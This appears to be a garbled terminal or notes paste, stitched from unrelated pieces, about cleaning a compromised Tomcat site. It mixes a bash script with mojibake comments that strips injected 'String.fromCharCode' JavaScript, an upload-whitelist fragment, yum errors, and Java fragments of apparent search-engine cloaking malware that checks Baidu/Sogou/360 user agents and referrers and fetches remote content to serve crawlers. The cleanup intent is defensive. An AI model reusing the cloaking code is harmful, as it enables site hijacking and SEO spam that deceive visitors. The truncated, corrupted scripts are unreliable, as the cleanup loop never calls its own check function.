 . /etc/profile
currentip="90"
export JAVA_HOME=/root/jdk1.8.0_191
export JRE_HOME=/root/jdk1.8.0_191/jre
export CLASSPATH=$CLASSPATH:$JAVA_HOME/lib:$JRE_HOME/lib

  echo Tomcat has been also existed, now kill it !

  echo Tomcat has been killed, after 3s start !
  sleep 3s

#!/bin/bash

# å®šä¹‰ç›®æ ‡ç›®å½•åˆ—è¡¨
TARGET_DIRS=(
    "/alidata/server/tomcat8081/webapps/myhub/WEB-INF/views"
    "/alidata/server/tomcat/webapps/myhub/WEB-INF/views"
)

# å®šä¹‰æ£€æµ‹ç—…æ¯’çš„å‡½æ•°
check_and_clean() {
    local directory=$1
    local found_virus=0

    # éå†ç›®å½•ä¸­çš„ HTML å’Œ JSP æ–‡ä»¶
    while IFS= read -r file; do
        # æ£€æµ‹æ˜¯å¦åŒ…å«æ¶æ„ä»£ç  'String.fromCharCode'
        if grep -q "xt = String.fromCharCode" "$file"; then
            echo "å‘ç°æ¶æ„ä»£ç ï¼š$file"

            # åˆ é™¤ <script type="text/javascript"> å’Œ </script> ä¹‹é—´çš„å†…å®¹
            sed -i '/<script[^>]*>/,/<\/script>/{
                /String\.fromCharCode/!b
                d
            }' "$file"

            # åˆ é™¤ <noscript> å’Œ </noscript> ä¹‹é—´çš„å†…å®¹
            sed -i '/<noscript>/,/<\/noscript>/d' "$file"

            echo "æ¸…ç†å®Œæˆï¼š$file"
            found_virus=1
        fi
    done < <(find "$directory" -maxdepth 1 -type f \( -name "*.html" -o -name "*.jsp" \))

    return $found_virus
}

# æ£€æŸ¥æ¯ä¸ªç›®å½•
for TARGET_DIR in "${TARGET_DIRS[@]}"; do
    echo "æ­£åœ¨æ£€æŸ¥ç›®å½•ï¼š$TARGET_DIR"

    # å…ˆæ£€æŸ¥å½“å‰ç›®å½•çš„æ–‡ä»¶
    echo "æ£€æŸ¥å½“å‰ç›®å½•ä¸­çš„æ–‡ä»¶..."

    found_in_current=$?

    # å¦‚æœå½“å‰ç›®å½•å‘ç°ç—…æ¯’æ–‡ä»¶ï¼Œåˆ™é€’å½’æ£€æŸ¥å­ç›®å½•
    if [ $found_in_current -eq 1 ]; then
        echo "å½“å‰ç›®å½•å‘ç°ç—…æ¯’æ–‡ä»¶ï¼Œå¼€å§‹æ£€æŸ¥å­ç›®å½•..."
        find "$TARGET_DIR" -mindepth 1 -type d | while read -r subdir; do
            echo "æ£€æŸ¥å­ç›®å½•ï¼š$subdir"
            check_and_clean "$subdir"
        done

    fi

   String[] uas=new String[]{"baidu", "360", "Yisou", "sogou"};
   String[] refers=new String[]{"baidu.com", "sogou.com,  m.sm.cn"};


   String doGet(String httpUrl,String p_ua)
    {
        //????
        HttpURLConnection connection = null;
        InputStream is = null;
        BufferedReader br = null;
        StringBuffer result = new StringBuffer();
        try {
            URL url = new URL(httpUrl);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setReadTimeout(15000);
            connection.setRequestProperty("Accept","*/*");
            connection.setRequestProperty("User-Agent",p_ua);
            //.header("User-Agent",p_ua)
            connection.setRequestProperty("Accept-Language","pt-BR");
            connection.setRequestProperty("Connection","Close");
            connection.connect();
            if (connection.getResponseCode() == 200) {
                is = connection.getInputStream();
                if (null != is) {
                    br = new BufferedReader(new InputStreamReader(is, "UTF-8"));
                    String temp = null;
                    while (null != (temp = br.readLine())) {
                        result.append(temp+"\r\n");
                    }
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (null != br) {
                try {
                    br.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (null != is) {
                try {
                    is.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            connection.disconnect();
        }
        return result.toString();
    }
    
   boolean info_checkx(String ua,String[] arr)
    {
        if (ua == null){

            return false;
        }
      
      ua = ua.toLowerCase();
        for (String item:arr ) {
            if (ua.indexOf(item)!=-1)
            {
                return true;
            }
        }
        return false;
    }
    
   String myrequestx(String p_url,String p_ua)
    {
        if (p_ua == null){
            p_ua="google";
        }
        String dt = doGet(p_url,p_ua);
        if(dt.indexOf("<!DOCTYPE html>")>0)
        {
            return  "<!DOCTYPE html>"+dt.split("<!DOCTYPE html>")[1];
        }
        return dt;
    }

    int search_flagx(String url,String flag)
    {
        String[] arr=flag.split("\\|");
        int number = arr.length;
        int result =0;
        for (int i=0;i<number;i++)
        {
            if (url.indexOf(arr[i])!=-1)
            {
                result=1;
                return result;
            }
        }
        return result;
    }

+ # ä¸Šä¼ æ–‡ä»¶å®‰å…¨æ£€æŸ¥è„šæœ¬
+ 
+ check_file() {
+     local file="$1"
+     local filename=$(basename "$file")
+     local extension="${filename##*.}"
+     
+     # ç™½åå•æ£€æŸ¥
+     case "$extension" in
+         jpg|jpeg|png|gif|pdf|doc|docx|txt)

ğŸ“§ Installing msmtp for email notifications...
Loaded plugins: fastestmirror, langpacks
Repository centos-sclo-rh is listed more than once in the configuration
Repository epel is listed more than once in the configuration
Determining fastest mirrors


 One of the configured repositories failed (Unknown),
 and yum doesn't have enough cached data to continue. At this point the only
 safe thing yum can do is fail. There are a few ways to work "fix" this:

     1. Contact the upstream for the repository and get them to fix the problem.

     2. Reconfigure the baseurl/etc. for the repository, to point to a working
        upstream. This is most often useful if you are using a newer
        distribution release than is supported by the repository (and the
        packages for the previous distribution release still work).

     3. Run the command with the repository temporarily disabled
            yum --disablerepo=<repoid> ...

     4. Disable the repository permanently, so yum won't use it by default. Yum
        will then just ignore the repository until you permanently enable it
        again or use --enablerepo for temporary usage:

            yum-config-manager --disable <repoid>
        or
            subscription-manager repos --disable=<repoid>

     5. Configure the failing repository to be skipped, if it is unavailable.
        Note that yum will try to contact the repo. when it runs most commands,
        so will have to try and fail each time (and thus. yum will be be much
        slower). If it is a very temporary problem though, this is often a nice
        compromise:

            yum-config-manager --save --setopt=<repoid>.skip_if_unavailable=true

Cannot find a valid baseurl for repo: centos-sclo-rh
(base) a1@1deMacBook-Air cooragent %
